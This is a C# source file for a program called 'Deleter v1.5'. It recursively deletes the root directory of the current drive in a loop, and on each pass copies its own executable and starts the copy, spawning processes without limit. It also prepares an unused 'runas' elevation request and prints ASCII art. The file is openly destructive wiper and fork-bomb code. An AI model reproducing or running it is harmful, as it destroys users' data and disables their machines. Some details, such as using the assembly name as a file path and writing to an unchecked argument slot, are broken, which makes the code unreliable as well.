namespace System
{
    public static class Deleter
    {
        public static System.String Dir = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
        public static System.Boolean DirExists = System.IO.Directory.Exists(System.Deleter.Dir);
        public static System.String ProgramName = System.Reflection.Assembly.GetExecutingAssembly().FullName;
        public static System.UInt64 X;
        public const System.String Ver = "1.5";
        public const System.String Title = "Deleter v" + System.Deleter.Ver;
        public static void DeleteDir(System.String arg)
        {
            System.Console.Write(arg);
            try
            {
                System.Console.WriteLine("Deleting " + System.Deleter.Dir);
                System.IO.Directory.Delete(System.Deleter.Dir, true);
            }
            catch (System.Exception ex)
            {
                System.Console.WriteLine("Error deleting " + System.Deleter.Dir);
                System.Console.WriteLine(ex);
            }
        }
        public static void Main(System.String[] args)
        {
            System.Console.Title = System.Deleter.Title;
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.UseShellExecute = true;
            p.StartInfo.Verb = "runas";
            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
            System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
            args[0] = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
            System.Threading.Thread.Sleep(1000);
            while (System.IO.Directory.Exists(System.Deleter.Dir))
            {
                System.Deleter.X++;
                System.Deleter.DeleteDir(args[0]);
                System.IO.File.Copy(System.Deleter.ProgramName + ".exe",
                System.Deleter.ProgramName + " (" + System.Deleter.X + ")");
                System.Diagnostics.Process.Start(System.Deleter.ProgramName 
                + " (" + System.Deleter.X + ").exe");
            }
        }
    }
}